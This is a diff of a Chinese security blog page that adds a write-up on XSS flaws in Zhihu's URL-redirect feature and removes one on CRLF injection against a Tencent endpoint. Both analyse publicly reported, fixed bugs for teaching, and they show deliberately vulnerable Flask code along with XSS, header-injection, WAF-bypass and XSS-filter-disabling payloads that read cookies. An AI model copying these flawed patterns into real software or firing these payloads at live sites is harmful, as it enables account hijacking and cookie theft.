@@ -259,6 +259,122 @@
             
               
                 
+                <a class="post-title-link" href="/2016/04/09/Problems-Caused-by-URL-Redirection/" itemprop="url">
+                  一个URL跳转引发的一系列“惨案”
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-04-09T13:45:01+08:00" content="2016-04-09">
+              2016-04-09
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/04/09/Problems-Caused-by-URL-Redirection/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/04/09/Problems-Caused-by-URL-Redirection/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在知乎的题目和答案中，插入的链接都会变成<code>https://link.zhihu.com/target=xxx</code>的形式进行URL跳转，如下图。然而这个看似简单的功能的实现上，曾引发过一系列的问题，过程挺精彩，所以我就来做个总结，以重新体验一下这个过程。声明：以下小节中提到的问题均来自WooYun已经公开的漏洞，复现的代码也是纯属我个人YY。<br><img src="/images/20160409140054.png" alt="ZhihuURLRedirect"></p>
+<h2 id="0x00-没有任何过滤"><a href="#0x00-没有任何过滤" class="headerlink" title="0x00 没有任何过滤"></a>0x00 没有任何过滤</h2><p>案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0171240" target="_blank" rel="external">知乎 URL 跳转造成的 XSS</a></p>
+<p>猜测知乎可能的实现方式：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    target = request.args.get(<span class="string">'target'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;window.location.href = "%s"&lt;/script&gt;'''</span> % (target)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
+<p>在上面这个实现中，我们可以发现对于<code>&quot;</code>并没有进行转义，因此我们可以传入<code>&quot;</code>来闭合前面的双引号，然后再插入我们的JS代码。运行上面的程序<code>python server.py</code>，然后使用curl请求：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">'127.0.0.1:5000/?target=";alert(1);window.location.href="http://www.zhihu.com'</span></span><br><span class="line">&lt;script&gt;window.location.href = <span class="string">""</span>;alert(<span class="number">1</span>);window.location.href=<span class="string">"http://www.zhihu.com"</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/20160409141842.png" alt="XSS_1"></p>
+<h2 id="0x01-对参数做了urlencode编码"><a href="#0x01-对参数做了urlencode编码" class="headerlink" title="0x01 对参数做了urlencode编码"></a>0x01 对参数做了urlencode编码</h2><p>在上面的漏洞报告之后，（猜测）知乎的工程师按照了洞主给出的修复方案进行代码的修改，修改后的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    target = request.args.get(<span class="string">'target'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;</span><br><span class="line">var URI="%s";</span><br><span class="line">window.location.href = decodeURIComponent(URI);</span><br><span class="line">&lt;/script&gt;'''</span> % (urllib.quote(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure>
+<p>现在，我们如果在target参数中传入<code>&quot;</code>，则先会被转义成<code>%22</code>插入在页面中，从而无法闭合之前的双引号。看似一个挺好的的解决方案吧，然而，却还不够。案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0179329" target="_blank" rel="external">知乎某处XSS+刷粉超详细漏洞技术分析</a>。我们可以看到后台将输入的target参数传入给URI参数，解码以后赋值于location.href。问题解决了？没有，可以利用JavaScript:伪协议执行js代码，如<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?<span class="keyword">target</span>=javascript:alert(1);</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/20160409143927.png" alt="XSS_2"></p>
+<p>强烈推荐仔细阅读这个案例哦，洞主的分析利用过程保证你看了会觉得很有收获。</p>
+<h2 id="0x02-使用WTForm进行URL校验"><a href="#0x02-使用WTForm进行URL校验" class="headerlink" title="0x02 使用WTForm进行URL校验"></a>0x02 使用WTForm进行URL校验</h2><p>（猜测开发内心OS）既然如此，Python不是有个叫做<code>WTForm</code>的库可以帮我们校验用户的输入是否合法吗？我们可以利用里面的<a href="http://wtforms.readthedocs.org/en/latest/validators.html?highlight=URL#wtforms.validators.URL" target="_blank" rel="external">wtforms.validators.URL</a>进行URL的检查，这样子用户的输入该合法了吧。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField</span><br><span class="line"><span class="keyword">from</span> wtforms.form <span class="keyword">import</span> Form</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired, URL</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UrlForm</span><span class="params">(Form)</span>:</span></span><br><span class="line">    target = StringField(validators=[DataRequired(), URL()])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="decorator">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = UrlForm(request.args)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> form.validate():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Bad Boy!"</span></span><br><span class="line"></span><br><span class="line">    target = form.target.data.encode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'''&lt;script&gt;</span><br><span class="line">var URI="%s";</span><br><span class="line">window.location.href = decodeURIComponent(URI);</span><br><span class="line">&lt;/script&gt;'''</span> % (urllib.quote(target))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这里也有可能是开发自己写正则进行匹配，问题本质上都是一样的，正则写的不好。上面的写法虽然已经能过滤到前面提到的情况，然而，WTForm的正则过滤并没有写好，导致继续被XSS。如下的URL：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5000</span>/?target=javascript:<span class="regexp">//www</span>.baidu.com/<span class="variable">%E2</span><span class="variable">%80</span><span class="variable">%A8alert</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/20160409151521.png" alt="XSS_3"></p>
+<p>具体分析见案例<a href="http://www.wooyun.org/bugs/wooyun-2016-0182145" target="_blank" rel="external">知乎某处XSS导致刷粉</a>及<a href="http://drops.wooyun.org/papers/13058" target="_blank" rel="external">从WTForm的URLXSS谈开源组件的安全性</a></p>
+<h2 id="0x03-除了XSS之外的一个彩蛋"><a href="#0x03-除了XSS之外的一个彩蛋" class="headerlink" title="0x03 除了XSS之外的一个彩蛋"></a>0x03 除了XSS之外的一个彩蛋</h2><p>这里本身其实是一个任意URL调整，可以在某些实现不严格的OAuth2.0的过程中利用偷取用户的授权code，然后使用用户的身份进行登录哦。在我之前的博客已经分析过这个问题，这里就不再写了。案例：<a href="http://www.wooyun.org/bugs/wooyun-2016-0174018" target="_blank" rel="external">微博上你点我链接我就上你绑定过的知乎账号</a></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做一个程序员不容易啊！请善待我们。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/02/16/The-Weakness-of-Weibo-OAuth2-0/" itemprop="url">
                   “脆弱”的微博OAuth 2.0
                 </a>
@@ -398,145 +514,11 @@
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/01/31/CRLF-Injection-and-Bypass-WAF/" itemprop="url">
-                  CRLF Injection and Bypass Tencent WAF
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-01-31T14:01:31+08:00" content="2016-01-31">
-              2016-01-31
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/01/31/CRLF-Injection-and-Bypass-WAF/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/01/31/CRLF-Injection-and-Bypass-WAF/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是一篇关于HTTP Response Split（CRLF Injection）漏洞的及绕过腾讯WAF导致前端出现XSS的实例分析，个人觉得在这个过程中能学到点知识，因此整理出来分享一下，如果不感兴趣记得及时关闭页面。</p>
-<h2 id="关于HRS问题"><a href="#关于HRS问题" class="headerlink" title="关于HRS问题"></a>关于HRS问题</h2><p>我们都知道，HTTP协议是依靠两个CRLF，即<code>\r\n</code>来分割HTTP头部及响应体。基于这个认知，可以推出，HRS问题是由于服务端程序没有过滤掉头部中的特殊字符<code>%0D%0A</code>，直接输出到了返回的数据中，导致错误的解析。而在日常开发中，最常见的莫过于有以下的两种功能（1）URL跳转（2）Cookie的设置中出现。接下来的小节里，将会以一个Cookie实例作来说明这个问题的危害。实例在：<a href="http://wooyun.org/bugs/wooyun-2016-0173904" target="_blank" rel="external">http://wooyun.org/bugs/wooyun-2016-0173904</a> ，目前腾讯已经修复了。</p>
-<h2 id="接口说明"><a href="#接口说明" class="headerlink" title="接口说明"></a>接口说明</h2><p>这个接口在大家使用微信红包的过程中都用过，我用xxx.com代表接口的域名，具体接口的功能我就先不说，虽然危害不大。接口如下：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">https:</span><span class="comment">//xxx.com/cgi-bin/xxx/geiwofahongbaowojiugaosuni?exportkey=&amp;pass_ticket=a</span></span><br></pre></td></tr></table></figure></p>
-<p>返回<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="status">HTTP/1.1 <span class="number">200</span> OK</span></span><br><span class="line"><span class="attribute">Server</span>: <span class="string">nginx/1.6.0</span></span><br><span class="line"><span class="attribute">Date</span>: <span class="string">Sat, 30 Jan 2016 12:08:28 GMT</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">text/html; charset=gbk</span></span><br><span class="line"><span class="attribute">Content-Length</span>: <span class="string">0</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attribute">Cache-Control</span>: <span class="string">no-cache, must-revalidate</span></span><br><span class="line"><span class="attribute">Set-Cookie</span>: <span class="string">pass_ticket=a; Domain=xxx.com; Path=/; Expires=Sun, 31-Jan-2016 12:08:28 GMT</span></span><br></pre></td></tr></table></figure></p>
-<p>在微信端这个接口其实没有什么问题，因为微信客户端会把这个参数替换掉，因此攻击者填入的参数就会被直接去掉，然而在浏览器中，却导致了XSS。</p>
-<h2 id="一步一个脚印"><a href="#一步一个脚印" class="headerlink" title="一步一个脚印"></a>一步一个脚印</h2><h4 id="0x00-插入img标签"><a href="#0x00-插入img标签" class="headerlink" title="0x00 插入img标签"></a>0x00 插入img标签</h4><p>从上面接口的返回数据中，可以看到pass_ticket参数的值出现在了Set-Cookie头部中，我们先试试能不能用插入两个CRLF，然后插入img标签。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
-<p>然而这个请求返回了空，浏览器根本不去解析body里的内容。不能放弃，通过curl分析一下，发现其实后端并没有过滤，请求都返回了，只是Content-Length为0导致浏览器认为Body为空，使用命令<code>curl -kv &lt;url&gt;</code>可以看到以下的错误提示。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* Excess found in a non pipelined read: excess = <span class="number">84</span> url = </span><br><span class="line">  /cgi-bin/xxx/geiwofahongbaowojiugaosuni?exportkey=&amp;pass_ticket=a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">3</span>E</span><br><span class="line">  (zero-length body)</span><br></pre></td></tr></table></figure></p>
-<p>知道问题之后，我们下一步就是想方法让Content-Length的值不为0！试着在头部插入<code>Content-Length: 60</code>,得到以下的URL<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:<span class="number">60</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
-<p>浏览器里访问，bingo，图片出现了！</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="status">HTTP/1.1 <span class="number">200</span> OK</span></span><br><span class="line"><span class="attribute">Server</span>: <span class="string">nginx/1.6.0</span></span><br><span class="line"><span class="attribute">Date</span>: <span class="string">Sat, 30 Jan 2016 12:15:03 GMT</span></span><br><span class="line"><span class="attribute">Content-Type</span>: <span class="string">text/html; charset=gbk</span></span><br><span class="line"><span class="attribute">Content-Length</span>: <span class="string">60</span></span><br><span class="line"><span class="attribute">Connection</span>: <span class="string">keep-alive</span></span><br><span class="line"><span class="attribute">Cache-Control</span>: <span class="string">no-cache, must-revalidate</span></span><br><span class="line"><span class="attribute">Set-Cookie</span>: <span class="string">pass_ticket=a</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span>&gt;</span>; Domain=wx.tenpay.com; Path=/; Expires=Sun, 31-J</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/zhchbin/zhchbin.github.io/source/source/images/56af0f2a143cfa3753b39a38XV1CJIiq.png" alt=""></p>
-<h4 id="0x01-尝试执行脚本"><a href="#0x01-尝试执行脚本" class="headerlink" title="0x01 尝试执行脚本"></a>0x01 尝试执行脚本</h4><p>能够插入img标签之后，我半生不熟的前端知识告诉我，src=1，图片肯定会加载失败，失败了就会有onerror的事件发生。于是，试试下面的URL<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%<span class="number">0</span>d%<span class="number">0</span>aContent-Length:<span class="number">60</span>%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">3</span>Cimg%<span class="number">20</span>src=<span class="number">1</span>%<span class="number">20</span>onerror=alert(<span class="number">1</span>)%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
-<p>事实告诉我们，现实并没有想象中的美好，服务器直接返回了501，这是什么原因导致的？尝试几次之后推断是被WAF拦截了。WAF是Web Application Firewall的缩写，我们的“恶意”请求被它检查出来。试了一下，发现在被和谐的的onerror和alert中间插入一些其他字符，就不会被拦截，例如：<code>on\error=al\ert(1)</code>，然而这并没有什么卵用，因为这根本就不是合法的HTML属性。</p>
-<h4 id="0x02-Bypass-WAF"><a href="#0x02-Bypass-WAF" class="headerlink" title="0x02 Bypass WAF"></a>0x02 Bypass WAF</h4><p>有WAF，就得考虑如何绕过，然而在确认了自己的认知范围里并没有绕过的方法后，我去请教了<a href="http://www.wooyun.org/whitehats/mramydnei" target="_blank" rel="external">@mramydnei</a>。以下是他提供的思路及Bypass WAF的例子：</p>
-<p>大概原理就是： </p>
-<ol>
-<li>插入Content-Type更改response中的charset</li>
-<li>选择一个字符集，保证该字符集中的某个字符或字符串会被浏览器忽略（也可以是unicode transform）</li>
-<li>将会被忽略的字符插入到被blacklist拦截的字符之间</li>
-<li>done</li>
-</ol>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exportkey=&amp;pass_ticket=a%<span class="number">0</span>D%<span class="number">0</span>AContent-Length:<span class="number">120</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-Type:text/html;%<span class="number">20</span>charset=ISO-<span class="number">2022</span>-JP%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">3</span>Cimg%<span class="number">20</span>src=x%<span class="number">20</span>on%<span class="number">1</span>B%<span class="number">28</span>Jerror=al%<span class="number">1</span>B%<span class="number">28</span>Jert%<span class="number">28</span>document.domain%<span class="number">29</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
-<p>看到他的回复后，我只有一个想法：人要有敬畏之心！后来找了一下，在Chrome的Issue List找到了一些相关的讨论，<a href="https://crbug.com/114941" target="_blank" rel="external">https://crbug.com/114941</a></p>
-<h4 id="0x03-绕过浏览器的XSS过滤"><a href="#0x03-绕过浏览器的XSS过滤" class="headerlink" title="0x03 绕过浏览器的XSS过滤"></a>0x03 绕过浏览器的XSS过滤</h4><p>由于是反射型的XSS，Chrome里直接访问的时候会发现它拦截了脚本的执行，虽然在firefox里是可行的。从上面中的分析过程中，我们可以知道一个事情：可以在返回的头部的信息里插入任何头部信息！这看上去很赞，于是就想起了Chrome的XSS过滤是可以被关闭的，只要你返回的头部中带有<code>X-XSS-Protection:0</code>，构造URL如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exportkey=&amp;pass_ticket=a%<span class="number">0</span>D%<span class="number">0</span>AContent-Length:<span class="number">120</span>%<span class="number">0</span>D%<span class="number">0</span>AX-XSS-Protection:<span class="number">0</span>%<span class="number">0</span>D%<span class="number">0</span>AContent-Type:text/html;%<span class="number">20</span>charset=ISO-<span class="number">2022</span>-JP%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">3</span>Cimg%<span class="number">20</span>src=x%<span class="number">20</span>on%<span class="number">1</span>B%<span class="number">28</span>Jerror=%<span class="number">22</span>al%<span class="number">1</span>B%<span class="number">28</span>Jert%<span class="number">28</span>document.co%<span class="number">1</span>B%<span class="number">28</span>Jokie%<span class="number">29</span>%<span class="number">22</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
-<p>点击后可以看到页面弹出了用户的Cookie，好了。虽然我们的<code>xxx.com</code>只是它的某个子域，这里的Cookie却弹出了其他子域名的，为什么呢？因为前端用了<code>document.domain = xx.com</code>。</p>
-<p><img src="https://raw.githubusercontent.com/zhchbin/zhchbin.github.io/source/source/images/56af08cb143cfae54c9777d4NE61bZEx.png" alt=""></p>
-<h2 id="最后说几句"><a href="#最后说几句" class="headerlink" title="最后说几句"></a>最后说几句</h2><p>在这个过程中，你学到了什么呢？反思这个过程，我觉得是信息量好大。对于我们做开发的，我认为最重要的一点是，用户的输入都是不可信的（这句话已经被无数人说过无数次了应该）。另外我读了一下Python Web框架里的一些代码，发现有些框架已经帮我们处理掉部分问题，例如在Flask中调用设置Cookie的相关接口中，<code>werkzeug</code>会使用白名单的机制检查每个byte，如果发现恶意字符，则将输入的值中用双引号包围起来，同时还有转义一部分字符，具体代码在这里：<a href="https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/_internal.py#L222" target="_blank" rel="external">https://github.com/mitsuhiko/werkzeug/blob/master/werkzeug/_internal.py#L222</a> 。</p>
-<p>放几个参考链接：</p>
-<ol>
-<li><a href="https://en.wikipedia.org/wiki/HTTP_response_splitting" target="_blank" rel="external">https://en.wikipedia.org/wiki/HTTP_response_splitting</a></li>
-<li><a href="http://blog.bentkowski.info/2014/07/google-doodle-xss-actually-response.html" target="_blank" rel="external">http://blog.bentkowski.info/2014/07/google-doodle-xss-actually-response.html</a> </li>
-<li><a href="http://drops.wooyun.org/papers/2466" target="_blank" rel="external">http://drops.wooyun.org/papers/2466</a></li>
-</ol>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/4/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/6/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -577,7 +559,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">18</span>
+              <span class="site-state-item-count">19</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
